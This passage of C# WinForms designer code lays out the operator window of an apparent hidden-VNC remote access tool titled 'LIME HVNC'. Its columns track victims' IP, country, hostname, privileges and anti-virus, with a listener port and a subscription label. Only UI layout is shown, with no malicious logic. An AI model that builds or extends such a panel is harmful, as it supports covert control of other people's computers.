            this.label11.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.ForeColor = System.Drawing.Color.Silver;
            this.label11.Location = new System.Drawing.Point(107, 29);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(87, 20);
            this.label11.TabIndex = 31;
            this.label11.Text = "Welcome:";
            // 
            // statusStrip1
            // 
            this.statusStrip1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.statusStrip1.BackColor = System.Drawing.Color.Black;
            this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
            this.statusStrip1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ClientsOnline});
            this.statusStrip1.Location = new System.Drawing.Point(2, 649);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(70, 22);
            this.statusStrip1.SizingGrip = false;
            this.statusStrip1.TabIndex = 33;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // ClientsOnline
            // 
            this.ClientsOnline.ForeColor = System.Drawing.Color.Gainsboro;
            this.ClientsOnline.Name = "ClientsOnline";
            this.ClientsOnline.Size = new System.Drawing.Size(53, 17);
            this.ClientsOnline.Text = "Online 0";
            // 
            // StartPort
            // 
            this.StartPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.StartPort.BackColor = System.Drawing.Color.Transparent;
            this.StartPort.CheckedState.BorderColor = System.Drawing.Color.DimGray;
            this.StartPort.CheckedState.BorderRadius = 2;
            this.StartPort.CheckedState.BorderThickness = 1;
            this.StartPort.CheckedState.FillColor = System.Drawing.Color.Black;
            this.StartPort.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.StartPort.CheckedState.InnerBorderRadius = 2;
            this.StartPort.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.StartPort.Location = new System.Drawing.Point(1188, 648);
            this.StartPort.Name = "StartPort";
            this.StartPort.Size = new System.Drawing.Size(55, 20);
            this.StartPort.TabIndex = 34;
            this.StartPort.UncheckedState.BorderColor = System.Drawing.Color.DimGray;
            this.StartPort.UncheckedState.BorderRadius = 2;
            this.StartPort.UncheckedState.BorderThickness = 1;
            this.StartPort.UncheckedState.FillColor = System.Drawing.Color.Black;
            this.StartPort.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.StartPort.UncheckedState.InnerBorderRadius = 2;
            this.StartPort.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.StartPort.CheckedChanged += new System.EventHandler(this.StartPort_CheckedChanged);
            // 
            // label12
            // 
            this.label12.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label12.AutoSize = true;
            this.label12.BackColor = System.Drawing.Color.Transparent;
            this.label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label12.Location = new System.Drawing.Point(1124, 651);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(57, 15);
            this.label12.TabIndex = 35;
            this.label12.Text = "Listener :";
            // 
            // label13
            // 
            this.label13.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label13.ForeColor = System.Drawing.Color.White;
            this.label13.Location = new System.Drawing.Point(1017, 648);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(244, 20);
            this.label13.TabIndex = 36;
            this.label13.Text = "[                                             ]";
            // 
            // ListenPort
            // 
            this.ListenPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.ListenPort.BackColor = System.Drawing.Color.Transparent;
            this.ListenPort.BorderColor = System.Drawing.Color.Black;
            this.ListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.ListenPort.DisabledState.BorderColor = System.Drawing.Color.Black;
            this.ListenPort.DisabledState.FillColor = System.Drawing.Color.Black;
            this.ListenPort.DisabledState.ForeColor = System.Drawing.Color.White;
            this.ListenPort.FillColor = System.Drawing.Color.Black;
            this.ListenPort.FocusedState.BorderColor = System.Drawing.Color.Black;
            this.ListenPort.FocusedState.FillColor = System.Drawing.Color.Black;
            this.ListenPort.FocusedState.ForeColor = System.Drawing.Color.White;
            this.ListenPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.ListenPort.ForeColor = System.Drawing.Color.Black;
            this.ListenPort.Location = new System.Drawing.Point(1032, 646);
            this.ListenPort.Maximum = new decimal(new int[] {
            65553,
            0,
            0,
            0});
            this.ListenPort.Minimum = new decimal(new int[] {
            1025,
            0,
            0,
            0});
            this.ListenPort.Name = "ListenPort";
            this.ListenPort.Size = new System.Drawing.Size(90, 25);
            this.ListenPort.TabIndex = 144;
            this.ListenPort.UpDownButtonFillColor = System.Drawing.Color.Black;
            this.ListenPort.Value = new decimal(new int[] {
            4448,
            0,
            0,
            0});
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Black;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "ye.png");
            this.imageList1.Images.SetKeyName(243, "yt.png");
            this.imageList1.Images.SetKeyName(244, "za.png");
            this.imageList1.Images.SetKeyName(245, "zm.png");
            this.imageList1.Images.SetKeyName(246, "zw.png");
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.UseTransparentDrag = true;
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "connected_480px.png");
            this.imageList2.Images.SetKeyName(1, "disconnected_480px.png");
            // 
            // HVNCList
            // 
            this.HVNCList.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.HVNCList.BackColor = System.Drawing.Color.Black;
            this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader3,
            this.columnHeader2,
            this.columnHeader1,
            this.columnHeader4,
            this.columnHeader5,
            this.columnHeader7,
            this.columnHeader6,
            this.columnHeader8,
            this.columnHeader9,
            this.columnHeader10});
            this.HVNCList.ContextMenuStrip = this.guna2ContextMenuStrip1;
            this.HVNCList.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HVNCList.ForeColor = System.Drawing.Color.White;
            this.HVNCList.FullRowSelect = true;
            this.HVNCList.HideSelection = false;
            this.HVNCList.LabelEdit = true;
            this.HVNCList.Location = new System.Drawing.Point(2, 75);
            this.HVNCList.Name = "HVNCList";
            this.HVNCList.Size = new System.Drawing.Size(1500, 565);
            this.HVNCList.SmallImageList = this.imageList1;
            this.HVNCList.TabIndex = 145;
            this.HVNCList.UseCompatibleStateImageBehavior = false;
            this.HVNCList.View = System.Windows.Forms.View.Details;
            this.HVNCList.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(this.HVNCList_DrawItem);
            this.HVNCList.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(this.HVNCList_DrawSubItem);
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "[IP Address]";
            this.columnHeader3.Width = 110;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "[hVNC Version]";
            this.columnHeader2.Width = 110;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "[Country]";
            this.columnHeader1.Width = 90;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "[Hostname]";
            this.columnHeader4.Width = 110;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "[OS]";
            this.columnHeader5.Width = 110;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "[Stub Version]";
            this.columnHeader7.Width = 100;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "[Active From]";
            this.columnHeader6.Width = 110;
            // 
            // columnHeader8
            // 
            this.columnHeader8.Text = "[Privileges]";
            this.columnHeader8.Width = 100;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Text = "[Anti-Virus]";
            this.columnHeader9.Width = 110;
            // 
            // columnHeader10
            // 
            this.columnHeader10.Text = "[Ping]";
            this.columnHeader10.Width = 90;
            // 
            // HVNCListenBtn
            // 
            this.HVNCListenBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.HVNCListenBtn.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.portToolStripMenuItem,
            this.HVNCListenPort,
            this.toolStripSeparator3});
            this.HVNCListenBtn.Name = "HVNCListenBtn";
            this.HVNCListenBtn.Size = new System.Drawing.Size(189, 32);
            this.HVNCListenBtn.Text = "listening Port";
            this.HVNCListenBtn.Click += new System.EventHandler(this.HVNCListenBtn_Click);
            // 
            // portToolStripMenuItem
            // 
            this.portToolStripMenuItem.Name = "portToolStripMenuItem";
            this.portToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.portToolStripMenuItem.Text = "Port :";
            // 
            // HVNCListenPort
            // 
            this.HVNCListenPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.HVNCListenPort.Name = "HVNCListenPort";
            this.HVNCListenPort.Size = new System.Drawing.Size(100, 21);
            this.HVNCListenPort.Text = "9031";
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(157, 6);
            // 
            // guna2VScrollBar1
            // 
            this.guna2VScrollBar1.BindingContainer = this.HVNCList;
            this.guna2VScrollBar1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.guna2VScrollBar1.FillColor = System.Drawing.Color.Black;
            this.guna2VScrollBar1.InUpdate = false;
            this.guna2VScrollBar1.LargeChange = 10;
            this.guna2VScrollBar1.Location = new System.Drawing.Point(1484, 75);
            this.guna2VScrollBar1.Name = "guna2VScrollBar1";
            this.guna2VScrollBar1.ScrollbarSize = 18;
            this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 565);
            this.guna2VScrollBar1.TabIndex = 146;
            this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.guna2VScrollBar1.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // timer1
            // 
            this.timer1.Interval = 10000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // bunifuSeparator1
            // 
            this.bunifuSeparator1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
            this.bunifuSeparator1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator1.BackgroundImage")));
            this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.bunifuSeparator1.Location = new System.Drawing.Point(1, 69);
            this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(2);
            this.bunifuSeparator1.Name = "bunifuSeparator1";
            this.bunifuSeparator1.Size = new System.Drawing.Size(1501, 10);
            this.bunifuSeparator1.TabIndex = 263;
            // 
            // label3
            // 
            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F);
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(223, 653);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(41, 15);
            this.label3.TabIndex = 265;
            this.label3.Text = "label3";
            // 
            // label4
            // 
            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F);
            this.label4.Location = new System.Drawing.Point(159, 653);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(60, 15);
            this.label4.TabIndex = 264;
            this.label4.Text = "Sub Until:";
            // 
            // PEGASUS
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1503, 673);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.guna2VScrollBar1);
            this.Controls.Add(this.HVNCList);
            this.Controls.Add(this.ListenPort);
            this.Controls.Add(this.label12);
            this.Controls.Add(this.StartPort);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.label10);
            this.Controls.Add(this.label11);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.chkSounds);
            this.Controls.Add(this.Listener);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.guna2PictureBox1);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.guna2ControlBox3);
            this.Controls.Add(this.guna2ControlBox2);
            this.Controls.Add(this.guna2ControlBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.label9);
            this.Controls.Add(this.label13);
            this.Controls.Add(this.bunifuSeparator1);
            this.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "PEGASUS";
            this.Text = "LIME HVNC";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.PEGASUS_FormClosed);
            this.Load += new System.EventHandler(this.PEGASUS_Load);
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).EndInit();
            this.guna2ContextMenuStrip1.ResumeLayout(false);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

		}
	}
}
